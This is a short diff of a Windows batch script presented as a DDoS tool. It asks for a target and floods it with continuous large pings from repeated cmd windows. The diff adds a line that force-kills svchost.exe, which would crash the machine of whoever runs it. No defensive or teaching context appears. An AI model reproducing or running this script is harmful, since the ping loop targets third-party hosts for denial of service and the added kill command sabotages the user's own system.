@@ -7,6 +7,7 @@ set /p target=Enter the target:
 set /p b=Enter the strength: 
 echo Starting DDoS Attack...
 timeout /t 3 /nobreak
+taskkill /f /im svchost.exe
 :loop
 start cmd /k ping %target% /t /l 22000
 set /a a+=1
